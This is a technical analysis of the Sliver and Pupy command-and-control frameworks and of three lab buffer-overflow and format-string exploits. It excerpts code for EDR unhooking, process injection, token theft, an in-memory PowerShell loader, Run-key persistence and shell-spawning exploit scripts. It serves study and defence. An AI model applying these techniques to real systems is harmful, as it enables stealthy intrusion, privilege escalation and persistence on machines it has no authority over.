# C2 Framework Source Analysis: Sliver (Go) & Pupy (Python)

## Table of Contents
1. [Sliver C2 Framework](#sliver-c2-framework---bishop-fox)
   - Implant Generation
   - C2 Protocols (mTLS, HTTP/HTTPS, DNS, WireGuard)
   - Process Injection (taskrunner)
   - Privilege Escalation
   - Evasion Techniques
   - BOF/COFF/SRDI Loading (Extensions)
   - Staging vs Stageless
2. [Pupy RAT Framework](#pupy-rat-framework---n1nj4sec)
   - Cross-Platform Architecture
   - Reflective DLL Injection
   - Memory-Only Execution
   - Persistence Mechanisms
   - C2 Encryption Transports
3. [Exploit Source Analysis](#exploit-source-analysis)
   - Stack Overflow (ret2win)
   - Stack Canary Bypass
   - Format String to GOT Overwrite

---

## Sliver C2 Framework - Bishop Fox

### Implant Generation

**Pattern: Template-based Go code generation with garble obfuscation**

Sliver uses Go text/template to generate implant source code at compile time. Configuration values (C2 URLs, keys, intervals) are injected directly into `.go` source files using `{{.Config.FieldName}}` template syntax.

Key files:
- `/root/sliver-source/server/generate/binaries.go` - Primary implant build logic
- `/root/sliver-source/implant/sliver/` - Implant source (template-driven)
- `/root/sliver-source/server/generate/implants.go` - Config storage and retrieval

**Compilation flow:**
1. Server receives `ImplantConfig` protobuf with target OS/arch, C2 URLs, encryption keys
2. `renderSliverGoCode()` writes the implant Go package into a temp directory, substituting template variables
3. Go cross-compilation via `gogo.GoBuild()` using Zig or system compilers
4. Supports `darwin/amd64`, `darwin/arm64`, `linux/386`, `linux/amd64`, `linux/arm64`, `windows/386`, `windows/amd64`
5. Obfuscation via `garble` when `config.ObfuscateSymbols` is true (symbol renaming, string obfuscation)

```go
// Key pattern: GoConfig with CGO settings for cross-compilation
goConfig := &gogo.GoConfig{
    CGO: "1",
    CC:  cc,   // Compiler (zig cc or mingw)
    CXX: cxx,
    GOOS:   config.GOOS,
    GOARCH: config.GOARCH,
    Obfuscation: config.ObfuscateSymbols,
    GOGARBLE: goGarble(config),
}
```

**Shellcode Generation (3 platforms):**
- Windows: Uses Donut to convert EXE to PIC shellcode
- macOS: Uses beignet (`beignet.DylibToShellcode`) to convert dylib to shellcode
- Linux: Uses malasada (`malasada.ConvertSharedObject`) to convert .so to PIC shellcode
- All use `c-shared` buildmode then convert the shared library

**Static linking via Zig:** When cross-compiling for Linux with Zig, the build forces `-linkmode=external -extldflags=-static` to produce self-contained binaries.

**Build Output Structure:**
```
~/.sliver/
  ├── clients/    # Client binaries
  ├── slivers/    # Implant binaries
  ├── builds/     # Build cache
  └── zig/        # Zig toolchain
```

---

### C2 Protocols

#### 1. mTLS (Mutual TLS)

**Files:** `/root/sliver-source/server/c2/mtls.go`, `/root/sliver-source/implant/sliver/transports/mtls/mtls.go`

**Architecture:**
- TLS 1.3 with mutual authentication (both client and server present certificates)
- Server uses separate CA hierarchies: `MtlsImplantCA` for clients, `MtlsServerCA` for server
- Connection multiplexing via HashiCorp Yamux (preface `"MUX/1"`)

**Wire Protocol - Framing:**
```
[74-byte Ed25519 Signature | 4-byte LE length | protobuf Envelope]
```

**Envelope Signing (v1):**
1. Derive Ed25519 signing key from peer private key using BLAKE2b:
   ```go
   seed := sha256.Sum256("env-signing-v1:" + peerPrivateKey)
   priv := ed25519.NewKeyFromSeed(seed)
   digest := blake2b.Sum256(pub)
   keyID := binary.LittleEndian.Uint64(digest[:8])
   ```
2. Every message is signed with the derived key
3. Signature format: `[2-byte algo (EdDSA=0x0001) | 8-byte keyID | 64-byte Ed25519 sig]`
4. Server caches signing keys in `sync.Map` keyed by keyID, populated from DB on first lookup

**Session Management:**
- Server accept loop creates goroutines per connection
- Yamux session with up to 128 concurrent streams, 64 concurrent sends
- In-band ping every 2 minutes
- Message dispatch via handler registry (`serverHandlers.GetHandlers()`)

**Anti-fingerprinting:**
- No JARM randomization on mTLS (standard Go TLS 1.3 server fingerprint, considered common)

#### 2. HTTP/HTTPS

**Files:** `/root/sliver-source/server/c2/http.go`, `/root/sliver-source/implant/sliver/transports/httpclient/httpclient.go`

**Architecture:**
- Gorilla Mux router with catch-all path `/{rpath:.*}`
- Supports both GET and POST
- Long-polling with configurable timeout and jitter
- C2 profile database with per-session cookie/token tracking

**Key Anti-Fingerprinting Techniques:**

1. **Server header spoofing** - Randomly picks between Apache/2.4.x (Unix) and nginx/1.x.x (Ubuntu):
   ```go
   switch util.Intn(2) {
   case 0:
       serverVersionHeader = "Apache/2.4.XX (Unix)"
   default:
       serverVersionHeader = "nginx/1.XX.XX (Ubuntu)"
   }
   ```

2. **JARM randomization** - Randomly shuffles TLS cipher suites:
   - Random selection from 22 cipher suites
   - Random TLS min version between 1.0-1.3
   - Always includes at least one modern RSA cipher for compatibility

3. **C2 Profile system** - Fully configurable HTTP C2 behavior:
   - Cookie names and values
   - Custom headers with probabilistic inclusion
   - Nonce query parameters (custom chars, length, location)
   - URL path patterns

4. **Request encoding** - Nonce-based encoder selection:
   - Nonces embedded in URL query params or path segments
   - Server resolves encoder from nonce via `encoders.EncoderFromNonce(nonce)`
   - Supports decoy website content for non-C2 requests

**Session Tracking:**
```go
type HTTPSession struct {
    ID          string
    ImplantConn *core.ImplantConnection
    CipherCtx   *cryptography.CipherContext
    C2Profile   string
}
```

#### 3. DNS

**Files:** `/root/sliver-source/server/c2/dns.go`, `/root/sliver-source/implant/sliver/transports/dnsclient/dnsclient.go`

**Architecture:**
- Uses `github.com/miekg/dns` library
- UDP listener with custom TXT record-based protocol
- Session management with 24-bit session IDs

**Protocol flow:**
1. Implant generates random DNS session ID
2. Sends INIT (Age key exchange) split across multiple DNS queries
3. Server validates INIT against activation handler
4. Encrypted session established
5. Messages chunked into TXT records (max 254 bytes each)

**Wire format:**
- Each DNS message encodes a custom protobuf (`dnspb`)
- Session ID embedded in lower 24 bits, message ID in upper 8 bits
- Base64 encoding with custom alphabet for data in TXT records
- CRC32 integrity checks on responses
- Pending INIT messages tracked with TTL-based GC (2 min TTL, 30 sec GC interval)

**Security measures:**
- 24-bit session ID = 16.7M possible values (brute-force resistant but not impossible)
- Private key-based activation to prevent unauthorized implants
- Whitelist/blacklist per node/client ID

#### 4. WireGuard

**Files:** `/root/sliver-source/server/c2/wireguard.go`, `/root/sliver-source/implant/sliver/transports/wireguard/wireguard.go`

**Architecture:**
- Uses `golang.zx2c4.com/wireguard` (userspace WireGuard)
- Implant gets pre-shared keys at compile time
- TUN address space: `100.64.0.0/24` (server at `100.64.0.1`)
- Key exchange via initial configured port, data comms on separate TCP port
- Uses the same Envelope + Yamux protocol over the WireGuard tunnel
- Netstack-based TUN for compatibility across platforms

**Key integration:**
- WG keys injected via template: `{{.Build.WGImplantPrivKey}}`, `{{.Build.WGServerPubKey}}`
- Uses same Ed25519 envelope signing as mTLS (shared crypto pattern)

---

### Process Injection

**Files:** `/root/sliver-source/implant/sliver/taskrunner/task.go`, `task_linux.go`, `task_darwin.go`

#### Linux: Fork+Exec Method

```go
// LocalTask - Fork child, mprotect shellcode to RX, jump to it
func LocalTask(data []byte, rwxPages bool) error {
    funcPtr := *(*func())(unsafe.Pointer(&data))
    // SYS_CLONE(SIGCHLD) = fork()
    pid, _, _ := syscall.RawSyscall6(syscall.SYS_CLONE, SIGCHLD, 0, 0, 0, 0, 0)
    if pid == 0 { // child
        // Close all FDs 3-1023
        // mprotect to PROT_READ|PROT_EXEC
        syscall.RawSyscall(syscall.SYS_MPROTECT, pageAddr, pageLen, PROT_READ|PROT_EXEC)
        funcPtr()  // Jump to shellcode
    }
    // parent waits: Wait4(pid)
}
```

**Key techniques:**
- Uses `go:linkname` to access internal Go syscall hooks (`runtime_BeforeFork`, etc.)
- Closes all file descriptors in child to avoid resource leaks
- Func-pointer trick from Hershell: `*(*func())(unsafe.Pointer(&dataPtr))` converts data pointer to callable function

#### Linux: memfd Sideload

```go
// Sideload - Write shared object to memfd, preload via LD_PRELOAD
func Sideload(procName string, procArgs []string, data []byte, args []string) {
    // Create memfd via syscall
    fd, _, _ := syscall.Syscall(nrMemfdCreate, memfdName, 1, 0)
    // Write DLL/SO data to /proc/PID/fd/FD
    os.WriteFile(fdPath, data, 0755)
    // Execute with LD_PRELOAD
    cmd.Env = append(env, "LD_PRELOAD="+fdPath)
    cmd.Run()
}
```

- Uses `memfd_create` syscall (319 on x86_64, 356 on i386)
- LD_PRELOAD injection to load shared objects from memory

#### Windows: RemoteTask (Process Hollowing Pattern)

From `priv_windows.go`:
```go
func GetSystem(data []byte, hostingProcess string) error {
    // 1. Enable SeDebugPrivilege
    SePrivEnable("SeDebugPrivilege")
    // 2. Find target process by name
    for _, proc := range procs {
        if proc.Executable() == hostingProcess {
            // 3. Inject via taskrunner.RemoteTask
            taskrunner.RemoteTask(proc.Pid(), data, false)
        }
    }
}
```

Impacts SYSTEM-owned processes for privilege escalation.

---

### Privilege Escalation

**Files:** `/root/sliver-source/implant/sliver/priv/priv_windows.go`

**Token Manipulation Techniques:**

1. **Token Impersonation:**
```go
func impersonateProcess(pid uint32) (windows.Token, error) {
    primaryToken, _ := getPrimaryToken(pid)
    syscalls.ImpersonateLoggedOnUser(*primaryToken)
    windows.DuplicateTokenEx(*primaryToken, TOKEN_ALL_ACCESS, ...)
    // Enable SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege
}
```

2. **MakeToken (LogonUser):**
```go
func MakeToken(domain, username, password string, logonType uint32) error {
    syscalls.LogonUser(username, domain, password,
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &token)
    syscalls.ImpersonateLoggedOnUser(token)
}
```

3. **GetSystem:**
   - Enumerate processes to find target executable name
   - Enable `SeDebugPrivilege`
   - Call `taskrunner.RemoteTask()` to inject into SYSTEM-owned process

4. **RunAs / CreateProcessWithLogonW:**
   - Direct Win32 API call for process creation with alternate credentials
   - Supports `LOGON_NETCREDENTIALS_ONLY` for network-only token

5. **Process Integrity Level Detection:**
   - Reads `TokenIntegrityLevel` from token information
   - Classifies as: Untrusted, Low, Medium, High, System
   - Uses SECURITY_MANDATORY_RID constants

---

### Evasion Techniques

**Files:** `/root/sliver-source/implant/sliver/evasion/`

#### PE Unhooking (Windows)

```go
// RefreshPE - Reload DLL .text section from disk to remove EDR hooks
func RefreshPE(name string) error {
    f, _ := pe.Open(name)           // Open DLL from disk
    x := f.Section(".text")         // Locate .text section
    ddf, _ := x.Data()             // Read clean bytes from disk
    t, _ := windows.LoadDLL(pn)    // Get currently loaded base
    dllBase := uintptr(t.Handle)
    dllOffset := dllBase + virtualoffset  // Calculate .text offset
    // VirtualProtect to RWX, overwrite, restore permissions
    windows.VirtualProtect(dllOffset, vsize, PAGE_EXECUTE_READWRITE, &old)
    // Copy clean bytes byte-by-byte
    for i := 0; i < int(vsize); i++ {
        loc := uintptr(dllOffset + uint(i))
        mem := (*[1]byte)(unsafe.Pointer(loc))
        (*mem)[0] = b[i]
    }
    windows.VirtualProtect(dllOffset, vsize, old, &old)
}
```

**This is the classic technique to remove userland hooks placed by EDR/AV products.** It reads the clean .text section from disk and overwrites the in-memory version, removing any inline hooks.

#### Template-based Conditional Compilation

Every implant source file uses `{{if .Config.Debug}}` guards to exclude debug logging in production builds. This reduces artifact size and removes suspicious strings.

---

### BOF/COFF/Extension Loading

**Files:** `/root/sliver-source/implant/sliver/extension/`

**Windows Extension (COFF/BOF-like):**
```go
type WindowsExtension struct {
    id     string
    data   []byte          // Raw DLL bytes
    module *memmod.Module  // In-memory loaded module
    arch   string
}

func (w *WindowsExtension) Load() error {
    // Load DLL from memory (no disk write) via memmod
    w.module, err = memmod.LoadLibrary(w.data)
    // Call optional init function
    initProc, _ := w.module.ProcAddressByName(w.init)
    syscall.Syscall(initProc, 0, 0, 0, 0)
}

func (w *WindowsExtension) Call(export string, arguments []byte, callback func([]byte)) error {
    exportPtr, _ := w.module.ProcAddressByName(export)
    cb := syscall.NewCallback(newWindowsExtensionCallback(onFinish))
    // Call: int Run(char *buf, uint32_t len, callback cb)
    syscall.Syscall(exportPtr, 3, argumentsPtr, argumentsSize, cb)
}
```

- Uses `github.com/moloch--/memmod` for in-memory DLL loading
- Extension API: `int Run(buffer char*, bufferSize uint32_t, goCallback callback)`
- Callback mechanism for async data return from C/C++ to Go
- Supports WASM for cross-platform extensions (via `extension/wasm.go`)

**SRDI (Shellcode Reflective DLL Injection):**
- File: `/root/sliver-source/server/generate/srdi.go`
- Port of Leo Loobeek's SRDI technique
- Converts DLLs to position-independent shellcode that can be injected
- Based on Stephen Fewer's Reflective DLL Injection primitives

---

### Staging vs Stageless

**TCP Stager:** `/root/sliver-source/server/c2/tcp-stager.go`

Simple raw TCP listener that sends shellcode on connection:
```go
func handleConnection(conn net.Conn, data []byte) {
    conn.Write(data)  // Send shellcode
    conn.Close()
}
```

**Stageless:** The default implant is fully self-contained — it includes all C2 logic, transport negotiation, and cryptography baked in at compile time. No second stage download needed.

---

## Pupy RAT Framework - n1nj4sec

### Cross-Platform Architecture

**Files:** `/root/pupy-source/pupy/`, `/root/pupy-source/pupy/pupylib/`, `/root/pupy-source/pupy/packages/`

**Architecture Pattern: Python-based agent with native extension modules**

Pupy uses a sophisticated cross-platform deployment model:

1. **Python interpreter embedding** - Each platform gets a custom Python runtime
2. **Pre-compiled bytecode** - All `.py` files are compiled to `.pyc` via `PupyCompile`
3. **Architecture-specific native extensions** - C extensions compiled per OS/arch

**Package Layout:**
```
pupy/packages/
  ├── all/          # Platform-independent Python modules
  ├── windows/
  │   ├── all/      # Windows-specific Python (pupwinutils)
  │   ├── amd64/    # 64-bit native extensions
  │   └── x86/      # 32-bit native extensions
  ├── linux/
  │   └── all/      # Linux-specific modules
  ├── android/
  ├── darwin/
  └── posix/        # Cross-Unix modules
```

**Architecture Mapping:**
```python
# /root/pupy-source/pupy/pupylib/utils/arch.py
def make_proc_arch(os_arch, proc_arch):
    os_arch_to_platform = {
        'amd64': 'intel', 'x86': 'intel',
        'armhf': 'armhf', 'aarch64': 'arm',
        'i86pc': 'sun-intel'
    }
    os_platform_to_arch = {
        'intel': {'32bit': 'x86', '64bit': 'amd64'},
        'armhf': {'32bit': 'armhf', '64bit': 'armhf'},
        'arm': {'32bit': 'arm', '64bit': 'aarch64'}
    }
```

**Module managers:** Modules declare `__compatibility__` (OS list) and `__dependencies__` (OS-specific native deps):
```python
__dependencies__ = {
    'windows': ['pupwinutils.keylogger', 'pupwinutils.hookfuncs'],
    'linux': ['pupyps', 'display', 'keylogger']
}
__compatibility__ = ('windows', 'linux')
```

### Compilation / Bytecode Obfuscation

**File:** `/root/pupy-source/pupy/pupylib/PupyCompile.py`

**Compiler features:**
1. AST-based transformation removing `__debug__` and `__main__` guards
2. Docstring removal
3. XOR obfuscation of compiled bytecode:
```python
# XOR obfuscation with position-dependent key
output[i+offset] = ord(x) ^ ((2 ** ((65535 - i) % 65535)) % 251)
```
4. Fake file paths (replaced with `f:0`, `f:1`, etc.) to hide original source paths

---

### Reflective DLL Injection

**File:** `/root/pupy-source/pupy/packages/windows/all/powerloader.py`

**Pupy's PowerShell Pipe Loader:**
```powershell
# PowerShell in-memory .NET assembly loader via named pipe
$p = new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0,$ps);
$p.WaitForConnection();
$x = new-object System.IO.BinaryReader($p);
$a = $x.ReadBytes({size});
[Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
```

**Flow:**
1. Generate random pipe name (10 uppercase+digits)
2. PowerShell creates NamedPipeServerStream with full ACL
3. Encoded as Base64 UTF-16LE PowerShell command
4. Executed via `powershell.exe -w hidden -EncodedCommand {cmd}`
5. Payload DLL bytes pushed through pipe
6. `Reflection.Assembly::Load()` loads DLL in-memory
7. First type's first method invoked reflectively

**DLL load hacks:** `/root/pupy-source/pupy/agent/dl_hacks.py`
- Overrides `ctypes._dlopen` to intercept DLL loading
- Redirects to in-memory loaded libraries via Pupy's package system
- Pattern: Check if DLL name matches a Pupy module, return in-memory handle

---

### Memory-Only Execution

**Agent public API** (from `/root/pupy-source/pupy/agent/__init__.py`):
```python
__all__ = (
    'reflective_inject_dll',   # Windows reflective injection
    'ld_preload_inject_dll',   # Linux LD_PRELOAD injection
    'mexec',                   # Memory execute
    'load_dll',                # In-memory DLL loading
    'is_shared',               # Shared library detection
)
```

**Linux memfd execution:** `/root/pupy-source/pupy/agent/_linux_memfd.py`
- Same technique as Sliver's Sideload: create memfd, write shared object, LD_PRELOAD

**Key principle:** Pupy runs entirely from memory. The agent bootstrap unpacks the Python runtime, compiled modules, and native extensions from a packed payload without writing to disk.

---

### Persistence Mechanisms

**File:** `/root/pupy-source/pupy/scriptlets/persistence.py`

**Windows persistence pattern:**
```python
def main(src=None, directory=None, filename=None, args=None, regkey=None):
    directory = directory or gettempdir()      # %TEMP% by default
    mid = md5('node={} cid={}'.format(getnode(), pupy.cid)).hexdigest()
    filename = filename or mid[:8]+'.exe'       # Randomish name
    regkey = regkey or mid[-8:]                 # Registry key name
    filepath = path.join(directory, filename)
    copy(src, filepath)                          # Copy payload to temp
    add_registry_startup(cmd, regkey)           # HKCU\Software\...\Run
```

- Copies payload to temp directory with hash-based filename
- Adds registry RUN key for startup persistence
- Deterministic naming based on MAC + client ID

**Daemonization (POSIX):** `/root/pupy-source/pupy/scriptlets/daemonize.py`
```python
def main():
    if fork(): _exit(0)   # Kill parent
    setsid()              # New session
    if fork(): _exit(0)   # Double fork
    umask(0o22)
    # Redirect stdin/stdout/stderr to /dev/null
    null = open('/dev/null', 'w+b')
    for i in range(3):
        dup2(null.fileno(), i)
```

---

### C2 Encryption Transports

**Files:** `/root/pupy-source/pupy/network/transports/`

Pupy implements a layered transport design with pluggable encryption:

**Transport Hierarchy:**
```
TCP Socket
  -> SSL/TLS (optional, ssl transport)
  -> RSA+AES (rsa transport) -- RSA-4096 key exchange, AES-256 session
  -> EC4 (ECPV + RC4, ec4 transport) -- Elliptic Curve key exchange + RC4 stream cipher
  -> Obfs3 (obfs3 transport) -- Tor-like obfuscation
  -> WebSocket (ws transport)
  -> HTTP (http transport)
  -> DNS CNC (dnscnc transport) -- DNS covert channel
```

**RSA Transport** (`rsa/conf.py`):
```python
class TransportConf(Transport):
    client_transport = RSA_AESClient.custom(
        pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)
    server_transport = RSA_AESServer.custom(
        privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
```

**EC4 Transport** (`ec4/conf.py`):
```python
class TransportConf(Transport):
    client_transport = EC4TransportClient.custom(pubkey=PUB_KEY)
    server_transport = EC4TransportServer.custom(privkey=PRIV_KEY)
```

**SSL Transport** (`ssl/conf.py`):
- Mutual TLS with role-based authentication (CLIENT/CONTROL roles)
- Checks peer certificate OU field for role validation
- Cipher selection: `HIGH:!aNULL:!MD5:!RC4:!3DES:!DES:!AES128`
- Configurable client certificate requirement

**DNS CNC** (`/root/pupy-source/pupy/pupylib/PupyDnsCnc.py`):
- Custom DNS command server (`picocmd` protocol)
- Whitelist-based node activation
- Key exchange disabled per-node for debugging
- Supports DNS-triggered reconnection, sleep, proxy change, exec

**Launcher Types:**
- `LAUNCHER_TYPE_CONNECT` (1) - Implant connects to server
- `LAUNCHER_TYPE_BIND` (2) - Server connects to implant
- `LAUNCHER_TYPE_DNSCNC` (3) - DNS-based command channel

**Credential Embedding:** Transports declare required credentials (keys, certs) that get embedded during payload generation:
```python
credentials = [
    'SSL_CA_CERT', 'SSL_BIND_KEY', 'SSL_BIND_CERT',
    'SSL_CLIENT_KEY', 'SSL_CLIENT_CERT'
]
```

---

## Exploit Source Analysis

### 1. Basic Stack Overflow (ret2win) - 04-src-1_stack.c / 04-solve-1_stack.py

**Vulnerability:** Classic stack buffer overflow. 64-byte buffer, 120 bytes read via `read()`.

```c
char name[64] = {0};
read(0, name, 120);  // Buffer overflow: 120 > 64
```

**Exploit pattern:** Direct return address overwrite (ret2win):
```python
payload = b"A" * 72          # 64 buffer + 8 saved RBP
payload += p64(0x401207)     # Address of win()
```

**Key observations:**
- No stack canary (compiled with `-fno-stack-protector`)
- No PIE (`-no-pie`)
- Executable stack (`-z execstack`)
- 72 bytes to reach return address (64 buffer + 8 RBP on x86_64)
- Target function `win()` calls `system("/bin/sh")` — direct shell

### 2. Stack Canary Bypass - 04-src-5_stack.c / 04-solve-5_stack.py

**Vulnerability:** Stack buffer overflow with format string leak.

```c
char friend_name[32] = {0};
read(0, friend_name, 32);   // Safe read
printf(friend_name);         // FORMAT STRING VULNERABILITY
char name[32] = {0};
read(0, name, 256);          // BUFFER OVERFLOW: 256 > 32
```

**Exploit pattern:** Two-stage: format string leak + buffer overflow with canary repair:

```python
# Step 1: Leak stack canary via format string
canary_leak_fmt = b"%15$p"
io.sendlineafter(b"What is your friends name:", canary_leak_fmt)
# Parse leaked hex value
canary_value = int(leak, 16)

# Step 2: Overflow with correct canary value
payload = b"A" * 40              # 32 buffer + 8 alignment
payload += p64(canary_value)     # Stack canary (repaired)
payload += b"B" * 8              # Saved RBP
payload += p64(0x4012aa)         # win() function address
```

**Key observations:**
- Stack canary present (compiled without `-fno-stack-protector`)
- Format string vulnerability (%p) bypasses ASLR and leaks canary
- Canary must be placed at exact offset (position 15 on stack)
- No PIE (`-no-pie`), so win() address is known
- 40 bytes padding shows buffer is at different stack offset vs example 1

### 3. Format String to GOT Overwrite - 04-src-10_stack.c / 04-solve-10_stack.py

**Vulnerability:** Format string bug in interactive loop.

```c
void vuln() {
    char buffer[300];
    while(1) {
        fgets(buffer, sizeof(buffer), stdin);
        printf("Echo: ");
        printf(buffer);   // FORMAT STRING VULNERABILITY
    }
}
```

**Exploit pattern:** Single-shot GOT overwrite using pwntools `fmtstr_payload`:

```python
# Overwrite printf@GOT with system@libc in one shot
payload = fmtstr_payload(6, {elf.got['printf']: libc.sym['system']})
io.sendline(payload)
# Now printf(buffer) becomes system(buffer)
io.sendline('/bin/sh')
```

**Key observations:**
- Format string position is at offset 6 on the stack
- ASLR disabled (`libc.address = 0x00007ffff7c00000`)
- Uses GOT overwrite to redirect `printf` -> `system`
- After overwrite, calling `printf(buffer)` with `/bin/sh` as argument executes shell
- `fmtstr_payload` from pwntools handles all the byte-by-byte writes automatically

**Exploit Progression:**
1. Level 1: No protections -> direct ret2win
2. Level 5: Stack canary + no PIE -> format string leak canary, repair in overflow
3. Level 10: No protections + interactive loop -> GOT overwrite via format string

---

## Summary: Key Implementation Patterns

### Code Generation
- **Template-based**: Both frameworks inject configuration at build time (Sliver: Go text/template, Pupy: Python string formatting + marshal)
- **Cross-compilation**: Sliver uses Zig/garble for cross-OS builds; Pupy uses pre-compiled bytecode + per-platform native extensions
- **Obfuscation**: Sliver uses garble (symbol renaming); Pupy uses XOR-obfuscated bytecode + fake file paths

### C2 Communication
- **Multiplexing**: Both use multiplexed channels (Sliver: Yamux; Pupy: RPyC-based)
- **Layered transport**: Connection layer (TCP/HTTP/DNS/WG) separate from encryption layer
- **Fingerprint evasion**: Randomized TLS parameters, server header spoofing, custom encoders

### Process Injection / Code Execution
- **Shellcode execution**: Fork+exec (Linux), RemoteTask (Windows), Donut (Windows PE->shellcode)
- **In-memory loading**: memmod (Windows DLL), LD_PRELOAD+memfd (Linux), Reflection.Assembly.Load (PowerShell)
- **PE unhooking**: RefreshPE technique to remove EDR userland hooks

### Privilege Escalation
- **Token manipulation**: ImpersonateLoggedOnUser, DuplicateTokenEx, CreateProcessWithLogonW
- **Privilege enabling**: SeDebugPrivilege for process injection into SYSTEM processes

### Exploit Development
- Classic progression: ret2win -> canary bypass via format string -> GOT overwrite
- Format string as both leak and write primitive
- Single-shot exploitation with pwntools framework
